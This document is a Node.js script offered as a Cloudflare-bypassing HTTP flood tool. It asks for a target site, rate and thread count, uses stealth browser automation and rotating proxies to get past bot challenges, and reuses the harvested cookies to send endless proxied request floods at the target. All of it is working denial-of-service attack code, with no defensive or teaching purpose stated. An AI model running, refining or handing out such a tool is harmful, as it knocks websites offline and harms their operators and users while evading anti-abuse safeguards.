const puppeteer = require('puppeteer-extra');
const StealthPlugin = require('puppeteer-extra-plugin-stealth');
const AdblockerPlugin = require('puppeteer-extra-plugin-adblocker');
const axios = require('axios');
const fs = require('fs');
const readline = require('readline');
const colors = require('colors');

console.clear();
console.log("===========================================".green);
console.log("   🚀 Script by DuocDev – All Rights Reserved".cyan);
console.log("   🔒 Private Use Only | ❌ No Redistribution".yellow);
console.log("===========================================\n".green);

// Readline for user input
const rl = readline.createInterface({
  input: process.stdin,
  output: process.stdout
});

const ask = (q) => new Promise(resolve => rl.question(q, resolve));

// Main setup
(async () => {
  const target = await ask('Target (e.g. https://example.com): ');
  const port = await ask('Port (e.g. 443): ');
  const duration = parseInt(await ask('Duration in seconds: '));
  const rate = parseInt(await ask('Requests per second: '));
  const threads = parseInt(await ask('Threads: '));
  rl.close();

  const TARGET_URL = `${target}:${port}`;
  const DURATION = duration;
  const REQUEST_RATE = rate;
  const THREADS = threads;
  const PROXY_FILE = 'proxy.txt';
  const FLOOD_MODE = true;

  const proxies = fs.readFileSync(PROXY_FILE, 'utf8').split('\n').filter(Boolean);
  const userAgents = fs.readFileSync('ua.txt', 'utf8').split('\n').filter(Boolean);

  puppeteer.use(StealthPlugin());
  puppeteer.use(AdblockerPlugin({ blockTrackers: true }));

  async function getWorkingProxy() {
    for (const proxy of proxies) {
      try {
        const [ip, port] = proxy.split(':');
        const test = await axios.get('https://www.cloudflare.com/cdn-cgi/trace', {
          proxy: { host: ip, port: parseInt(port) },
          timeout: 5000
        });
        if (test.data.includes('uag=Mozilla')) return proxy;
      } catch (e) {}
    }
    throw new Error("No working proxies available");
  }

  async function detectChallenge(page) {
    const challengeTypes = {
      "Cloudflare 5s": 'iframe[src*="challenge.cloudflare.com"]',
      "Turnstile CAPTCHA": '.cf-turnstile',
      "hCaptcha": '.hcaptcha-box',
      "JS Challenge": '#cf-challenge-running'
    };
    for (const [type, selector] of Object.entries(challengeTypes)) {
      if (await page.$(selector)) {
        console.log(`[!] Detected ${type} Challenge`);
        return type;
      }
    }
    return null;
  }

  async function solveChallenge(page, challengeType) {
    switch (challengeType) {
      case "Cloudflare 5s": await page.waitForTimeout(5000); break;
      case "Turnstile CAPTCHA": await page.waitForTimeout(5000); break;
      case "hCaptcha": await page.waitForTimeout(5000); break;
      case "JS Challenge": await page.waitForTimeout(5000); break;
      default: await page.waitForTimeout(3000);
    }
  }

  async function launchBrowser(proxy) {
    const [ip, port] = proxy.split(':');
    const userAgent = userAgents[Math.floor(Math.random() * userAgents.length)];

    const browser = await puppeteer.launch({
      headless: true,
      args: [
        `--proxy-server=http://${ip}:${port}`,
        '--no-sandbox',
        '--disable-setuid-sandbox',
        '--disable-dev-shm-usage',
        '--disable-gpu'
      ]
    });

    const page = await browser.newPage();
    await page.setUserAgent(userAgent);
    await page.setViewport({ width: 1366, height: 768 });

    await page.goto(TARGET_URL, { waitUntil: 'networkidle2', timeout: 30000 });

    const challengeType = await detectChallenge(page);
    if (challengeType) await solveChallenge(page, challengeType);

    const cookies = await page.cookies();
    const sessionData = {
      cookies: cookies.map(c => `${c.name}=${c.value}`).join('; '),
      userAgent,
      proxy
    };

    await browser.close();
    return sessionData;
  }

  async function floodAttack(session) {
    const { cookies, userAgent, proxy } = session;
    for (let i = 0; i < REQUEST_RATE; i++) {
      axios.get(TARGET_URL, {
        headers: {
          'User-Agent': userAgent,
          'Cookie': cookies,
          'Accept-Language': 'en-US,en;q=0.9',
          'Referer': TARGET_URL
        },
        proxy: { host: proxy.split(':')[0], port: parseInt(proxy.split(':')[1]) },
        timeout: 5000
      }).catch(() => {});
    }
  }

  console.log(colors.green(`[+] Starting Cloudflare Bypass on ${TARGET_URL}`));

  for (let i = 0; i < THREADS; i++) {
    (async () => {
      while (true) {
        try {
          const proxy = await getWorkingProxy();
          const session = await launchBrowser(proxy);
          await floodAttack(session);
          console.log(colors.yellow(`[!] Flooding ${TARGET_URL} via ${proxy}`));
        } catch (e) {
          console.log(colors.red(`[X] Error: ${e.message}`));
        }
      }
    })();
  }

  setTimeout(() => {
    console.log(colors.green(`[✓] Attack completed after ${DURATION} seconds.`));
    process.exit(0);
  }, DURATION * 1000);
})();
